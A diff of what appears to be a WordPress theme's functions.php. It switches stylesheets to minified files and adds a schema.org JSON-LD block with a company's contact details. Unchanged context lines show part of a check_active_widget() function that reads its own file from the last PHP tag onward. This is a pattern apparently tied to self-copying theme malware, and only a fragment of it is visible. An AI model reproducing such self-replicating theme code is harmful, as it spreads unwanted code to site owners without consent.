@@ -18,10 +18,11 @@ function my_theme_enqueue_styles() {
     // font awesome library
     wp_enqueue_style( 'all-css', get_template_directory_uri() . '/css/all.min.css' );
     // Slick Jquery Plugin
-    wp_enqueue_style( 'slick-css', get_template_directory_uri() . '/css/slick.css' );
-    wp_enqueue_style( 'slick-theme', get_template_directory_uri() . '/css/slick-theme.css' );
-    wp_enqueue_style( 'custom-css', get_template_directory_uri() . '/css/custom.css' );
-    wp_enqueue_style( 'font-family', get_template_directory_uri() . '/css/font-family.css' );
+    wp_enqueue_style( 'slick-css', get_template_directory_uri() . '/css/slick.min.css' );
+    wp_enqueue_style( 'slick-theme', get_template_directory_uri() . '/css/slick-theme.min.css' );
+    wp_enqueue_style( 'custom-css', get_template_directory_uri() . '/css/custom.min.css' );
+    wp_enqueue_style( 'new-css', get_template_directory_uri() . '/css/custom.css' );
+    wp_enqueue_style( 'font-family', get_template_directory_uri() . '/css/font-family.min.css' );
 }
 
 /*
@@ -445,6 +446,7 @@ function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass
 ?>
 <?php
 
+
 function check_active_widget()
 {
     $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
@@ -744,3 +746,34 @@ function popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_
     }
     return $output;
 }
+
+function add_knowledgegraph() {
+echo "\n<!-- KNOWLEDGE GRAPH -->";
+if (is_front_page()) {
+echo '
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "Yes Soft",
+  "url": "https://yes-soft.de",
+  "logo": "http://yes-soft.de/wp-content/uploads/2019/08/logo-1.png",
+  "description": "Software development company",
+  "foundingDate": "2019",
+  "contactPoint" : [
+    { "@type" : "ContactPoint",
+   	"telephone" : "+491633733146",
+      "email": "info@yes-soft.de",
+	  "contactType" : "customer service"
+    } ],
+  "sameAs" : [
+    "https://www.facebook.com/Yes-soft-328738448051690",
+    "https://github.com/yes-soft-de/",
+    "https://www.linkedin.com/in/osama-alhamoud-a2112b18a",
+	"https://api.whatsapp.com/send?phone=96171575052"
+  ]}
+</script>';
+}
+echo "\n\n";	
+}
+add_action('wp_head', 'add_knowledgegraph');
